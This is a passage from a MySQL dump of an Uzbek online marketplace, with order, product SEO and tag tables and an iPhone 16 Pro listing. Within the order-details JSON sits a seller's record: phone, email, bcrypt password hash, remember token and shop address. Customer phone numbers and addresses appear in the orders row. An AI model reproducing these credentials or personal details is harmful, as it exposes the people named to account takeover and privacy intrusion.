font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">IMEI 1 - rasmiy ro\'yxatdan o\'tgan (ro\'yxatdan o\'tishni faollashtirish 30 kun ichida avtomatik tarzda amalga oshiriladi)<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">Display: Pro Max 6.9\\\" (2868 x 1320), 4K \\/ Pro 6.3\\\" (2622 x 1206)<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">Kafolat: 12 oy<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\"><h2 style=\\\"border: 0px; outline: none; font-size: 1.625rem; font-style: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; vertical-align: baseline; color: rgb(31, 32, 38); font-weight: 500; white-space-collapse: preserve; word-break: break-word; background-color: transparent !important;\\\">iPhone&nbsp;16 Pro \\/ 16 Pro Max<\\/h2><p style=\\\"border: 0px; outline: none; font-size: 0.875rem; font-style: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; vertical-align: baseline; white-space-collapse: preserve; word-break: break-word; background-color: transparent !important;\\\"><br style=\\\"border: 0px; outline: 0px; word-break: break-word; margin-top: 0px;\\\"><\\/p><\\/li><\\/ul><\\/div><\\/div>\",\"free_shipping\":0,\"attachment\":null,\"created_at\":\"2025-07-07T10:11:34.000000Z\",\"updated_at\":\"2025-07-07T10:11:50.000000Z\",\"status\":1,\"featured_status\":1,\"meta_title\":\"Smartfon iPhone 16 Pro\\/Pro Max, 128\\/256 GB, 1-SIM\\/dual SIM, g\'ilof sovg\'aga\",\"meta_description\":\"SIM kartalar soni Dual - nano SIM + eSimKamera: 48 MP ultra keng telefoto 4K , 120 fpsZaryadlovchi ulagich turi - USB-CZaryadlash funktsiyalari - simsiz zaryadl\",\"meta_image\":null,\"request_status\":1,\"denied_note\":null,\"shipping_cost\":0,\"multiply_qty\":0,\"temp_shipping_cost\":null,\"is_shipping_cost_updated\":null,\"code\":\"W1EXXT\",\"thumbnail_full_url\":{\"key\":\"2025-07-07-686b9d56ce1fd.webp\",\"path\":\"https:\\/\\/venu.uz\\/storage\\/app\\/public\\/product\\/thumbnail\\/2025-07-07-686b9d56ce1fd.webp\",\"status\":200},\"preview_file_full_url\":{\"key\":\"\",\"path\":null,\"status\":404},\"digital_file_ready_full_url\":{\"key\":\"\",\"path\":null,\"status\":404},\"digital_variation\":[],\"clearance_sale\":null,\"seller\":{\"id\":2,\"f_name\":\"Murod\",\"l_name\":\"Abdujamilov\",\"phone\":\"+998901230001\",\"image\":\"2025-06-29-6860ed00e3ad8.webp\",\"email\":\"future-1@gmail.com\",\"password\":\"$2y$10$NtyGRkH9hYnvbH1cGpGoee70CWRLCicSaJsySeuY8LUbQI8JEdIVu\",\"status\":\"approved\",\"remember_token\":\"qUaL3oi5WPzxWg7I9UEJCJIm2nMm0DJgNea31As35BkMu84QiMhro5HIlim7\",\"created_at\":\"2025-06-29T07:36:33.000000Z\",\"updated_at\":\"2025-06-29T07:36:33.000000Z\",\"bank_name\":null,\"branch\":null,\"account_no\":null,\"holder_name\":null,\"auth_token\":null,\"sales_commission_percentage\":null,\"gst\":null,\"cm_firebase_token\":null,\"pos_status\":0,\"minimum_order_amount\":0,\"free_delivery_status\":0,\"free_delivery_over_amount\":0,\"app_language\":\"en\",\"image_full_url\":{\"key\":\"2025-06-29-6860ed00e3ad8.webp\",\"path\":\"https:\\/\\/venu.uz\\/storage\\/app\\/public\\/seller\\/2025-06-29-6860ed00e3ad8.webp\",\"status\":200},\"shop\":{\"id\":2,\"seller_id\":2,\"name\":\"FUTURE - IT\",\"slug\":\"future-it-o2BCW1\",\"address\":\"\\u0433.\\u0422\\u0430\\u0448\\u043a\\u0435\\u043d\\u0442 \\u0423\\u0447\\u0442\\u043f\\u0438\\u043d\\u0441\\u043a\\u0438\\u0439 \\u0440\\u0430\\u0439\\u043e\\u043d \\u043a\\u0432 22 \\u0434 2 \\u043a\\u0432.31\",\"contact\":\"+998901230001\",\"image\":\"2025-06-29-6860ed0142b17.webp\",\"image_storage_type\":\"public\",\"bottom_banner\":\"def.png\",\"bottom_banner_storage_type\":\"public\",\"offer_banner\":null,\"offer_banner_storage_type\":\"public\",\"vacation_start_date\":null,\"vacation_end_date\":null,\"vacation_note\":null,\"vacation_status\":false,\"temporary_close\":false,\"created_at\":\"2025-06-29T07:36:33.000000Z\",\"updated_at\":\"2025-06-29T07:36:33.000000Z\",\"banner\":\"2025-06-29-6860ed0163f4f.webp\",\"banner_storage_type\":\"public\",\"image_full_url\":{\"key\":\"2025-06-29-6860ed0142b17.webp\",\"path\":\"https:\\/\\/venu.uz\\/storage\\/app\\/public\\/shop\\/2025-06-29-6860ed0142b17.webp\",\"status\":200},\"bottom_banner_full_url\":{\"key\":\"def.png\",\"path\":null,\"status\":404},\"offer_banner_full_url\":{\"key\":null,\"path\":null,\"status\":404},\"banner_full_url\":{\"key\":\"2025-06-29-6860ed0163f4f.webp\",\"path\":\"https:\\/\\/venu.uz\\/storage\\/app\\/public\\/shop\\/banner\\/2025-06-29-6860ed0163f4f.webp\",\"status\":200}},\"storage\":[{\"id\":2,\"data_type\":\"App\\\\Models\\\\Seller\",\"data_id\":\"2\",\"key\":\"image\",\"value\":\"public\",\"created_at\":\"2025-06-29T07:36:33.000000Z\",\"updated_at\":\"2025-06-29T07:36:33.000000Z\"}]}}',1,200,0,10,'exclude','pending','unpaid','2025-07-11 23:00:22','2025-07-11 23:00:22',NULL,'Yellow','{\"color\":\"Yellow\"}','discount_on_product',1,0);
/*!40000 ALTER TABLE `order_details` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_expected_delivery_histories`
--

DROP TABLE IF EXISTS `order_expected_delivery_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_expected_delivery_histories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `user_type` varchar(191) NOT NULL,
  `expected_delivery_date` date NOT NULL,
  `cause` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_expected_delivery_histories`
--

LOCK TABLES `order_expected_delivery_histories` WRITE;
/*!40000 ALTER TABLE `order_expected_delivery_histories` DISABLE KEYS */;
/*!40000 ALTER TABLE `order_expected_delivery_histories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_status_histories`
--

DROP TABLE IF EXISTS `order_status_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_status_histories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `user_type` varchar(191) NOT NULL,
  `status` varchar(191) NOT NULL,
  `cause` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_status_histories`
--

LOCK TABLES `order_status_histories` WRITE;
/*!40000 ALTER TABLE `order_status_histories` DISABLE KEYS */;
INSERT INTO `order_status_histories` VALUES
(1,100001,3,'customer','pending',NULL,'2025-07-11 23:00:22','2025-07-11 23:00:22'),
(2,100001,0,'admin','out_for_delivery',NULL,'2025-07-11 23:01:37','2025-07-11 23:01:37');
/*!40000 ALTER TABLE `order_status_histories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_transactions`
--

DROP TABLE IF EXISTS `order_transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_transactions` (
  `seller_id` bigint(20) NOT NULL,
  `order_id` bigint(20) NOT NULL,
  `order_amount` decimal(50,2) NOT NULL DEFAULT 0.00,
  `seller_amount` decimal(50,2) NOT NULL DEFAULT 0.00,
  `admin_commission` decimal(50,2) NOT NULL DEFAULT 0.00,
  `received_by` varchar(191) NOT NULL,
  `status` varchar(191) DEFAULT NULL,
  `delivery_charge` decimal(50,2) NOT NULL DEFAULT 0.00,
  `tax` decimal(50,2) NOT NULL DEFAULT 0.00,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `customer_id` bigint(20) DEFAULT NULL,
  `seller_is` varchar(191) DEFAULT NULL,
  `delivered_by` varchar(191) NOT NULL DEFAULT 'admin',
  `payment_method` varchar(191) DEFAULT NULL,
  `transaction_id` varchar(191) DEFAULT NULL,
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_transactions`
--

LOCK TABLES `order_transactions` WRITE;
/*!40000 ALTER TABLE `order_transactions` DISABLE KEYS */;
/*!40000 ALTER TABLE `order_transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `orders`
--

DROP TABLE IF EXISTS `orders`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `orders` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` varchar(15) DEFAULT NULL,
  `is_guest` tinyint(4) NOT NULL DEFAULT 0,
  `customer_type` varchar(10) DEFAULT NULL,
  `payment_status` varchar(15) NOT NULL DEFAULT 'unpaid',
  `order_status` varchar(50) NOT NULL DEFAULT 'pending',
  `payment_method` varchar(100) DEFAULT NULL,
  `transaction_ref` varchar(30) DEFAULT NULL,
  `payment_by` varchar(191) DEFAULT NULL,
  `payment_note` text DEFAULT NULL,
  `order_amount` double NOT NULL DEFAULT 0,
  `paid_amount` decimal(18,12) NOT NULL DEFAULT 0.000000000000,
  `bring_change_amount` decimal(18,12) DEFAULT 0.000000000000,
  `bring_change_amount_currency` varchar(255) DEFAULT NULL,
  `admin_commission` decimal(8,2) NOT NULL DEFAULT 0.00,
  `is_pause` varchar(20) NOT NULL DEFAULT '0',
  `cause` varchar(191) DEFAULT NULL,
  `shipping_address` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `discount_amount` double NOT NULL DEFAULT 0,
  `discount_type` varchar(30) DEFAULT NULL,
  `coupon_code` varchar(191) DEFAULT NULL,
  `coupon_discount_bearer` varchar(191) NOT NULL DEFAULT 'inhouse',
  `shipping_responsibility` varchar(255) DEFAULT NULL,
  `shipping_method_id` bigint(20) NOT NULL DEFAULT 0,
  `shipping_cost` double(8,2) NOT NULL DEFAULT 0.00,
  `is_shipping_free` tinyint(1) NOT NULL DEFAULT 0,
  `order_group_id` varchar(191) NOT NULL DEFAULT 'def-order-group',
  `verification_code` varchar(191) NOT NULL DEFAULT '0',
  `verification_status` tinyint(4) NOT NULL DEFAULT 0,
  `seller_id` bigint(20) DEFAULT NULL,
  `seller_is` varchar(191) DEFAULT NULL,
  `shipping_address_data` text DEFAULT NULL,
  `delivery_man_id` bigint(20) DEFAULT NULL,
  `deliveryman_charge` double NOT NULL DEFAULT 0,
  `expected_delivery_date` date DEFAULT NULL,
  `order_note` text DEFAULT NULL,
  `billing_address` bigint(20) unsigned DEFAULT NULL,
  `billing_address_data` text DEFAULT NULL,
  `order_type` varchar(191) NOT NULL DEFAULT 'default_type',
  `extra_discount` double(8,2) NOT NULL DEFAULT 0.00,
  `extra_discount_type` varchar(191) DEFAULT NULL,
  `free_delivery_bearer` varchar(255) DEFAULT NULL,
  `checked` tinyint(1) NOT NULL DEFAULT 0,
  `shipping_type` varchar(191) DEFAULT NULL,
  `delivery_type` varchar(191) DEFAULT NULL,
  `delivery_service_name` varchar(191) DEFAULT NULL,
  `third_party_delivery_tracking_id` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=100002 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `orders`
--

LOCK TABLES `orders` WRITE;
/*!40000 ALTER TABLE `orders` DISABLE KEYS */;
INSERT INTO `orders` VALUES
(100001,'3',0,'customer','paid','out_for_delivery','cash_on_delivery','',NULL,NULL,195,0.000000000000,0.000000000000,'UZS',0.00,'0',NULL,'1','2025-07-11 23:00:22','2025-07-11 23:14:10',0,NULL,'0','inhouse','inhouse_shipping',2,5.00,0,'4864-xCs8r-1752256821','578445',0,2,'seller','{\"id\":1,\"customer_id\":\"0\",\"is_guest\":false,\"contact_person_name\":\"fdsfdsaf\",\"email\":null,\"address_type\":\"permanent\",\"address\":\"fdsafdsf\",\"city\":\"Tashkent\",\"zip\":\"150300\",\"phone\":\"+998888112309\",\"created_at\":null,\"updated_at\":null,\"state\":null,\"country\":\"Uzbekistan\",\"latitude\":\"-33.8688\",\"longitude\":\"151.2195\",\"is_billing\":false}',1,0,NULL,NULL,2,'{\"id\":2,\"customer_id\":\"0\",\"is_guest\":false,\"contact_person_name\":\"Salom\",\"email\":null,\"address_type\":\"permanent\",\"address\":\"dsfsdaf\",\"city\":\"Tashkent\",\"zip\":\"150300\",\"phone\":\"+998888112309\",\"created_at\":null,\"updated_at\":null,\"state\":null,\"country\":\"Uzbekistan\",\"latitude\":\"-33.8688\",\"longitude\":\"151.2195\",\"is_billing\":true}','default_type',0.00,NULL,NULL,1,'order_wise','self_delivery',NULL,NULL);
/*!40000 ALTER TABLE `orders` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `password_resets` (
  `identity` varchar(191) NOT NULL,
  `token` varchar(191) NOT NULL,
  `otp_hit_count` tinyint(4) NOT NULL DEFAULT 0,
  `is_temp_blocked` tinyint(1) NOT NULL DEFAULT 0,
  `temp_block_time` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `user_type` varchar(191) NOT NULL DEFAULT 'customer',
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`),
  KEY `password_resets_email_index` (`identity`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_resets`
--

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `payment_requests`
--

DROP TABLE IF EXISTS `payment_requests`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `payment_requests` (
  `id` char(36) NOT NULL,
  `payer_id` varchar(64) DEFAULT NULL,
  `receiver_id` varchar(64) DEFAULT NULL,
  `payment_amount` decimal(24,2) NOT NULL DEFAULT 0.00,
  `gateway_callback_url` varchar(191) DEFAULT NULL,
  `success_hook` varchar(100) DEFAULT NULL,
  `failure_hook` varchar(100) DEFAULT NULL,
  `transaction_id` varchar(100) DEFAULT NULL,
  `currency_code` varchar(20) NOT NULL DEFAULT 'USD',
  `payment_method` varchar(50) DEFAULT NULL,
  `additional_data` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
  `is_paid` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `payer_information` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
  `external_redirect_link` varchar(255) DEFAULT NULL,
  `receiver_information` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
  `attribute_id` varchar(64) DEFAULT NULL,
  `attribute` varchar(255) DEFAULT NULL,
  `payment_platform` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `payment_requests`
--

LOCK TABLES `payment_requests` WRITE;
/*!40000 ALTER TABLE `payment_requests` DISABLE KEYS */;
/*!40000 ALTER TABLE `payment_requests` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `paytabs_invoices`
--

DROP TABLE IF EXISTS `paytabs_invoices`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `paytabs_invoices` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) unsigned NOT NULL,
  `result` text NOT NULL,
  `response_code` int(10) unsigned NOT NULL,
  `pt_invoice_id` int(10) unsigned DEFAULT NULL,
  `amount` double(8,2) DEFAULT NULL,
  `currency` varchar(191) DEFAULT NULL,
  `transaction_id` int(10) unsigned DEFAULT NULL,
  `card_brand` varchar(191) DEFAULT NULL,
  `card_first_six_digits` int(10) unsigned DEFAULT NULL,
  `card_last_four_digits` int(10) unsigned DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `paytabs_invoices`
--

LOCK TABLES `paytabs_invoices` WRITE;
/*!40000 ALTER TABLE `paytabs_invoices` DISABLE KEYS */;
/*!40000 ALTER TABLE `paytabs_invoices` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `personal_access_tokens`
--

DROP TABLE IF EXISTS `personal_access_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `personal_access_tokens` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(191) NOT NULL,
  `tokenable_id` bigint(20) unsigned NOT NULL,
  `name` varchar(191) NOT NULL,
  `token` varchar(64) NOT NULL,
  `abilities` text DEFAULT NULL,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `personal_access_tokens`
--

LOCK TABLES `personal_access_tokens` WRITE;
/*!40000 ALTER TABLE `personal_access_tokens` DISABLE KEYS */;
/*!40000 ALTER TABLE `personal_access_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phone_or_email_verifications`
--

DROP TABLE IF EXISTS `phone_or_email_verifications`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `phone_or_email_verifications` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `phone_or_email` varchar(191) DEFAULT NULL,
  `token` text DEFAULT NULL,
  `otp_hit_count` tinyint(4) NOT NULL DEFAULT 0,
  `is_temp_blocked` tinyint(1) NOT NULL DEFAULT 0,
  `temp_block_time` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phone_or_email_verifications`
--

LOCK TABLES `phone_or_email_verifications` WRITE;
/*!40000 ALTER TABLE `phone_or_email_verifications` DISABLE KEYS */;
/*!40000 ALTER TABLE `phone_or_email_verifications` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product_compares`
--

DROP TABLE IF EXISTS `product_compares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `product_compares` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) unsigned NOT NULL COMMENT 'customer_id',
  `product_id` bigint(20) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product_compares`
--

LOCK TABLES `product_compares` WRITE;
/*!40000 ALTER TABLE `product_compares` DISABLE KEYS */;
/*!40000 ALTER TABLE `product_compares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product_seos`
--

DROP TABLE IF EXISTS `product_seos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `product_seos` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `index` varchar(255) DEFAULT NULL,
  `no_follow` varchar(255) DEFAULT NULL,
  `no_image_index` varchar(255) DEFAULT NULL,
  `no_archive` varchar(255) DEFAULT NULL,
  `no_snippet` varchar(255) DEFAULT NULL,
  `max_snippet` varchar(255) DEFAULT NULL,
  `max_snippet_value` varchar(255) DEFAULT NULL,
  `max_video_preview` varchar(255) DEFAULT NULL,
  `max_video_preview_value` varchar(255) DEFAULT NULL,
  `max_image_preview` varchar(255) DEFAULT NULL,
  `max_image_preview_value` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product_seos`
--

LOCK TABLES `product_seos` WRITE;
/*!40000 ALTER TABLE `product_seos` DISABLE KEYS */;
INSERT INTO `product_seos` VALUES
(1,1,'Test product','salom','','','','','0','0','-1','0','-1','0','large','2025-07-04-6866e7e6271fe.webp','2025-07-04 01:28:22','2025-07-04 01:28:22'),
(2,2,'Iphone 14','256/GBqora...','','','','','0','0','-1','0','-1','0','large','2025-07-04-6866f76155163.webp','2025-07-04 02:34:25','2025-07-04 02:34:25'),
(3,3,'Smartfon iPhone 16 Pro/Pro Max, 128/256 GB, 1-SIM/dual SIM, g\'ilof sovg\'aga','SIM kartalar soni Dual - nano SIM + eSimKamera: 48 MP ultra keng telefoto 4K , 120 fpsZaryadlovchi ulagich turi - USB-CZaryadlash funktsiyalari - simsiz zaryadl','','','','','0','0','-1','0','-1','0','large','2025-07-07-686b9d57155d9.webp','2025-07-07 15:11:35','2025-07-07 15:11:35');
/*!40000 ALTER TABLE `product_seos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product_stocks`
--

DROP TABLE IF EXISTS `product_stocks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `product_stocks` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) DEFAULT NULL,
  `variant` varchar(255) DEFAULT NULL,
  `sku` varchar(255) DEFAULT NULL,
  `price` decimal(8,2) NOT NULL DEFAULT 0.00,
  `qty` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product_stocks`
--

LOCK TABLES `product_stocks` WRITE;
/*!40000 ALTER TABLE `product_stocks` DISABLE KEYS */;
/*!40000 ALTER TABLE `product_stocks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product_tag`
--

DROP TABLE IF EXISTS `product_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `product_tag` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) unsigned NOT NULL,
  `tag_id` bigint(20) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product_tag`
--

LOCK TABLES `product_tag` WRITE;
/*!40000 ALTER TABLE `product_tag` DISABLE KEYS */;
INSERT INTO `product_tag` VALUES
(1,1,1,NULL,NULL),
(2,2,2,NULL,NULL),
(3,2,3,NULL,NULL),
(4,2,4,NULL,NULL),
(5,3,5,NULL,NULL),
(6,3,3,NULL,NULL),
(7,3,4,NULL,NULL);
/*!40000 ALTER TABLE `product_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `products`
--

DROP TABLE IF EXISTS `products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `products` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `added_by` varchar(191) DEFAULT NULL,
  `user_id` bigint(20) DEFAULT NULL,
  `name` varchar(80) DEFAULT NULL,
  `slug` varchar(120) DEFAULT NULL,
  `product_type` varchar(20) NOT NULL DEFAULT 'physical',
  `category_ids` varchar(80) DEFAULT NULL,
  `category_id` varchar(191) DEFAULT NULL,
  `sub_category_id` varchar(191) DEFAULT NULL,
  `sub_sub_category_id` varchar(191) DEFAULT NULL,
  `brand_id` bigint(20) DEFAULT NULL,
  `unit` varchar(191) DEFAULT NULL,
  `min_qty` int(11) NOT NULL DEFAULT 1,
  `refundable` tinyint(1) NOT NULL DEFAULT 1,
  `digital_product_type` varchar(30) DEFAULT NULL,
  `digital_file_ready` varchar(191) DEFAULT NULL,
  `digital_file_ready_storage_type` varchar(10) DEFAULT 'public',
  `images` longtext DEFAULT NULL,
  `color_image` text NOT NULL,
  `thumbnail` varchar(255) DEFAULT NULL,
  `thumbnail_storage_type` varchar(10) DEFAULT 'public',
  `preview_file` varchar(255) DEFAULT NULL,
  `preview_file_storage_type` varchar(255) DEFAULT 'public',
  `featured` varchar(255) DEFAULT NULL,
  `flash_deal` varchar(255) DEFAULT NULL,
  `video_provider` varchar(30) DEFAULT NULL,
  `video_url` varchar(150) DEFAULT NULL,
  `colors` varchar(150) DEFAULT NULL,
  `variant_product` tinyint(1) NOT NULL DEFAULT 0,
  `attributes` varchar(255) DEFAULT NULL,
  `choice_options` text DEFAULT NULL,
  `variation` text DEFAULT NULL,
  `digital_product_file_types` longtext DEFAULT NULL,
  `digital_product_extensions` longtext DEFAULT NULL,
  `published` tinyint(1) NOT NULL DEFAULT 0,
  `unit_price` double NOT NULL DEFAULT 0,
  `purchase_price` double NOT NULL DEFAULT 0,
  `tax` varchar(191) NOT NULL DEFAULT '0.00',
  `tax_type` varchar(80) DEFAULT NULL,
  `tax_model` varchar(20) NOT NULL DEFAULT 'exclude',
  `discount` varchar(191) NOT NULL DEFAULT '0.00',
  `discount_type` varchar(80) DEFAULT NULL,
  `current_stock` int(11) DEFAULT NULL,
  `minimum_order_qty` int(11) NOT NULL DEFAULT 1,
  `details` text DEFAULT NULL,
  `free_shipping` tinyint(1) NOT NULL DEFAULT 0,
  `attachment` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
